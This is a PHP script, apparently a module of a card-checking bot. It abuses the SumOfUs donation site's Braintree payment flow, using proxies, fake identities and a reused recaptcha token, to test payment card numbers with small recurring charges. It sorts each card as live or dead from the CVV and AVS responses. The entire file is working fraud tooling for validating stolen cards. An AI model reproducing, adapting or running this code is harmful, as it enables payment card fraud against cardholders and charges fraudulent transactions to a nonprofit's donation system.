<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$sessionId = $this->tools->GenPass(32);

$correlation_id = $this->tools->GenPass(32);

$headers = [
	'Authority: chg6zpd9u7.execute-api.us-west-2.amazonaws.com',
	'Accept: */*',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Origin: https://actions.eko.org',
	'Referer: https://actions.eko.org/',
	'Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'Sec-Ch-Ua-Mobile: ?1',
	'Sec-Ch-Ua-Platform: "Android"',
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: cross-site',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
];

$r1 = $this->curlx->Get('https://chg6zpd9u7.execute-api.us-west-2.amazonaws.com/api/payment/braintree/token?merchantAccountId=sumofus2_EUR', $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$auth_token = trim(strip_tags($this->getstr($r1->body, '"token":"', '"')));

if (empty($auth_token)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$dec_auth = json_decode(base64_decode($auth_token));

if (!isset($dec_auth->authorizationFingerprint)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$auth = $dec_auth->authorizationFingerprint;

$data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sessionId.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}';

$headers = [
	'Accept: */*',
	'Authorization: Bearer '.$auth.'',
	'Accept-language: th,en-US;q=0.7,en;q=0.3',
	'Braintree-version: 2018-05-10',
	'Content-Type: application/json',
	'Origin: https://assets.braintreegateway.com',
	'Referer: https://assets.braintreegateway.com/web/3.62.1/html/hosted-fields-frame.min.html',
	'Sec-Fetch-Mode: cors'
];

$r2 = $this->curlx->Post('https://payments.braintree-api.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$token = $this->getstr($r2->body, 'token":"', '"');

if (empty($token)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'amount=1&currency=USD&recurring=true&store_in_vault=true&user%5Bname%5D='.$fake->first.'&user%5Bemail%5D='.urlencode($fake->email).'&user%5Bpostal%5D=10509&user%5Bphone%5D=2564567654&user%5Bcountry%5D=US&payment_method_nonce='.$token.'&device_data%5Bdevice_session_id%5D=14e30e16773933ddfb261ec84cdc078e&device_data%5Bfraud_merchant_id%5D=&device_data%5Bcorrelation_id%5D='.$correlation_id.'&recaptcha_token=03AGdBq25U-6QRR_4wLCvSre2qqJ2Lj_T9z-gUfernlte5Tec0hWMnDoST36gE9x2FGM2P5Bxln4NCYsIwb66rJIO6KqmUcO8b50UUAfjj0NNy9T-Zo40OJwskOdNokow9T9IFsrzaPAlU3raM11Mmavj-0MXsSPv5WTGjbOKKjnOxhMEO_4OYTtdqyQSpAVQpyq8MSR9BwtWe3sx0F4oEri22Ny0oXg1_wiceaHx4EdegY99r9y7zkdTegTYzTHj39qNKYFX64qZ39DA6z54y0weU7X2z-woyeeVWzjuIajsra6ADNPxun4OLRViJf_ZQ78-tcO08uv2uWp8-tYdyhAOUdXDZnu-qwRQ5AeMPQ6qr9LCQHvsTwafYspiUgGMra223COCVESi0gb8gtUJeR6pJILsbcz4VnQ&recaptcha_action=donate%2F567';

$headers = [
	'Accept: */*',
	'Authorization: ',
	'Host: actions.sumofus.org',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Origin: https://actions.sumofus.org',
	'Referer: https://actions.sumofus.org/a/donate',
	'Sec-Fetch-Mode: cors'
];

$r3 = $this->curlx->Post('https://actions.sumofus.org/api/payment/braintree/pages/567/transaction', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$cvv = trim($this->getstr($r3->body, '"cvv_result":{"code":"', '"'));

$avs = trim($this->getstr($r3->body, '"avs_result":{"code":"', '"'));

$msg = trim(str_replace('"', '', $this->getstr($this->getstr($r3->body, 'message":{', '}'), '[', ']')));

$err = $msg;

$err .= empty($cvv) ? "" : " | CVV -> $cvv";
$err .= empty($avs) ? "" : " | AVS -> $avs";

$status = ['status' => 'APPROVED', 'emoji' => '✅'];

if ($cvv == 'M') {
	$status['msg'] = "CVV CARD - $err!";
} elseif (strpos($msg, 'card verification number does not match') !== false || strpos(strtolower($msg), 'cvv') !== false) {
	$status['msg'] = "CCN CARD - $err!";
} elseif (strpos($msg, 'does not match') !== false || strpos(strtolower($msg), 'avs') !== false) {
	$status['msg'] = "CVV CARD - AVS FAILED -> $err!";
} elseif (strpos(strtolower($msg), 'insufficient funds') !== false) {
	$status['msg'] = "CCN CARD - $err!";
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.(empty($msg) ? 'Unknown Error' : $err).'!'];
}

end: